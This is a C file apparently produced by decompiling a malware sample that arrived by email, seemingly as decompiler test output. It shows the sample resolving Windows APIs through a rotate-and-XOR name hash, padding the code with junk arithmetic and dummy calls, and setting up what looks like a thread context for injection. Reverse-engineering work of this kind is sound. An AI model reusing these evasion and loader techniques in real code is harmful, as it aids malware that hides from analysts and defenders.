// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0103/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn0040100B(Eq_11 * fs)
{
	word32 eax_16 = LoadLibraryA(globals->t404008);
	globals->ptr4041B8 = fn004014B0(fs, eax_16, 0x647503D7);
	globals->ptr4041BC = fn004014B0(fs, eax_16, 0xB8FB31B6);
	ui32 eax_25 = dwLoc10 + 0x000005B5 | (dwLoc08 + 0x000000DC) + dwLoc08;
	globals->ptr4041C0 = fn004014B0(fs, eax_16, 0xB6319D71);
	globals->ptr4041C4 = fn004014B0(fs, eax_16, 0x8859C26B);
	ui32 eax_42 = dwLoc10 + 0x000015C9 + eax_25 * 0x00000002 | eax_25 * 0x00000002 + 0x00000094;
	globals->ptr4041C8 = fn004014B0(fs, eax_16, 0x8859EA6B);
	globals->ptr4041CC = fn004014B0(fs, eax_16, 0xF49C3629);
	globals->ptr4041D0 = fn004014B0(fs, eax_16, 0x863E97C0);
	ui32 eax_60 = dwLoc10 * 0x00000002 | eax_42 + 0x00000026 ^ (eax_42 * 0x00000002 ^ dwLoc10 * 0x00000002);
	globals->ptr4041D4 = fn004014B0(fs, eax_16, 0x1A8E020B);
	word32 eax_113 = eax_60 * 0x00000002 * 0x00000002 & dwLoc10 * 0x00000002 | eax_60 + 0x0000204C << (byte) (dwLoc10 * 0x00000002 + 0x000000D7);
	ui32 eax_92 = 0xFFFFF5C7 - dwLoc10 ^ eax_60 * 0x00000002;
	globals->ptr4041D8 = fn004014B0(fs, eax_16, 0x47B80934);
	globals->ptr4041DC = fn004014B0(fs, eax_16, 0x76BF899E);
	globals->ptr4041E0 = fn004014B0(fs, eax_16, 0x76BBCF1E);
	ui32 eax_151 = ((eax_113 & 0x00000000) * 0x00000002 + eax_60 * 0x00000008 + eax_92 + 0x000003C1) * 0x00000002;
	globals->ptr4041E4 = fn004014B0(fs, eax_16, 0x775E849E);
	ui32 eax_163 = eax_151 + 0x00001BE5 << (byte) (eax_151 + 0x00000009) ^ eax_92 * 0x00000002 >>u (byte) (eax_113 & 0x00000000);
	globals->ptr4041E8 = fn004014B0(fs, eax_16, 0x672C1825);
	globals->ptr4041EC = fn004014B0(fs, eax_16, 0x04AEC1B0);
	ui32 eax_215 = eax_92 * 0x00000002 ^ (eax_163 * 0x00000002 + 0x00000255) + eax_92 * 0x00000002 << (byte) (eax_92 * 0x00000002 + 0x000000A1);
	word32 eax_245 = 0xFFFFF53C - (eax_215 * 0x00000002) * 0x00000002;
	word32 eax_230 = eax_215 + 0x000000D9 + eax_215 | eax_163 * 0x00000004 + 0x00001B7F;
	globals->ptr4041F0 = fn004014B0(fs, eax_16, 0x0EEED9CD);
	uint32 edx_261 = eax_230 + 0x00000849 << (byte) (eax_245 << 0x00000003);
	uint8 cl_264 = (byte) (eax_245 + 0x0000004C + eax_245);
	Mem275[0x004041E0:word32]();
	uint32 eax_266 = edx_261 >>u cl_264;
	int32 ecx_287 = eax_266 + 0x000000CA + eax_266;
	int32 edx_288 = (eax_266 + 0x00001352) *s ecx_287;
	Mem275[0x004041DC:word32]();
	Mem275[0x004041DC:word32]();
	ui32 eax_290 = eax_266 + 0x00000546 & edx_288;
	word32 ecx_322 = eax_230 + 0x00002240 & eax_290 * 0x00000002;
	Mem275[0x004041DC:word32]();
	word32 eax_323 = eax_230 + eax_290;
	ui32 eax_325 = eax_323 + 0x000006D7 + eax_323 | ecx_322;
	word32 edx_340 = eax_325 * 0x00000002 + 0x000027F2 + (-(eax_290 * 0x00000002) + eax_325 * 0x00000002);
	Mem275[0x004041D8:word32]();
	globals->ptr4041F4 = fn004014B0(fs, fp - 0x00000030, 0x74D8B47E);
	globals->ptr4041F8 = fn004014B0(fs, fp - 0x00000030, 0x821DB4C5);
	globals->ptr4041FC = fn004014B0(fs, fp - 0x00000030, 0x9A399F22);
	globals->ptr404200 = fn004014B0(fs, fp - 0x00000030, 0x38650B26);
	globals->ptr404204 = fn004014B0(fs, fp - 0x00000030, 0x3B85D95D);
	word32 eax_342 = eax_325 * 0x00000002 + 0x00001F02 & edx_340;
	ui32 eax_396 = eax_325 * 0x00000004 + 0x00000057;
	uint8 cl_414 = (byte) (eax_325 + 0x0000002F + eax_325);
	Eq_305 eax_415 = eax_396 * 0x00000002 - ((((eax_325 + 0x000001DC) *s (eax_325 * 0x00000002) ^ (eax_290 + 0x0000002C) + eax_290 & (eax_342 + 0x00001241) + eax_342) & 0x00000000) * 0x00000002) *s (eax_396 * 0x00000002) >>u cl_414;
	int32 ecx_429 = eax_396 * 0x00000002 *s eax_415;
	ui32 edx_432 = eax_415 * 0x00000002 * 0x00000002;
	word32 eax_433 = eax_396 * 0x00000002 + ecx_429 * 0x00000004 | edx_432;
	Mem424[0x004041D8:word32]();
	globals->ptr404208 = fn004014B0(fs, eax_433, 0xDD4F418B);
	fn004016BD();
	Mem449[0x004041D4:word32]();
	return;
}

word32 fn004014B0(Eq_11 * fs, word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc14_15 = fs->dw0000;
	fs->dw0000 = fp - 0x00000014;
	Eq_365 * eax_65 = (dwArg04->dw003C + dwArg04)->dw0078 + dwArg04;
	word16 * eax_69[] = eax_65->dw0024 + dwArg04;
	if (SetFileSecurityA(0x00000000, 0x00000000, 0x00000000) != 0x00000000)
		dwArg08 = dwArg08 + 0x000079F4;
	fp->dwFFFFFFF8 = 0x00000000;
	fp->dwFFFFFFF8 = 0x00000000;
	fp->dwFFFFFFF8 = 0x00000000;
	fp->dwFFFFFFF8 = 0x0000029A;
	if (SetFileSecurityA(0x00000000, 0x00000000, 0x00000000) == 0x00000000)
		dwArg08 = dwArg08 + 0x000C679D;
	fp->dwFFFFFFF8 = 0xFFFFFFFF;
	word32 * eax_115[] = eax_65->dw0020 + dwArg04;
	word32 * eax_120[] = eax_65->dw001C + dwArg04;
	int32 esi_122 = 0x00000000;
	word32 eax_153;
	while (esi_122 < eax_65->dw0018)
	{
		uint32 eax_173 = 0x00000000;
		word32 ecx_189 = eax_115[esi_122] + dwArg04;
		dwLoc3C = dwLoc3C & 0x00000000;
		while (dwLoc3C->b0000 != 0x00)
		{
			eax_173 = (eax_173 << 0x00000007 | eax_173 >>u 0x00000019) ^ ((int32) dwLoc3C->b0000 ^ 0x00000055);
			dwLoc3C = dwLoc3C + 0x00000001;
		}
		if (eax_173 == dwArg08)
		{
			eax_153 = eax_120[(word32) eax_69[esi_122]] + dwArg04;
			goto l004016AA;
		}
		esi_122 = esi_122 + 0x00000001;
	}
	eax_153 = 0x00000000;
l004016AA:
	fs->dw0000 = dwLoc14_15;
	return eax_153;
}

void fn004016BD()
{
	GetModuleFileNameA(0x00000000, 0x0040420C, 0x00000104);
	Mem0[0x004041E0:word32]();
	Mem0[0x004041DC:word32]();
	Mem0[0x004041DC:word32]();
	Mem0[0x004041DC:word32]();
	Mem0[0x004041DC:word32]();
	globals->dw404414 = 0x00000044;
	globals->dw404440 = 0x00000001;
	globals->w404444 = 0x0002;
	Mem130[0x004041B8:word32]();
	GetModuleHandleA(0x00000000);
	Mem130[0x004041BC:word32]();
	Mem130[0x004041C0:word32]();
	globals->dw404468 = 0x00010007;
	Mem242[0x004041C4:word32]();
	globals->dw404520 = 0x00401D2D;
	Mem261[0x004041C8:word32]();
	Mem261[0x004041CC:word32]();
	return;
}

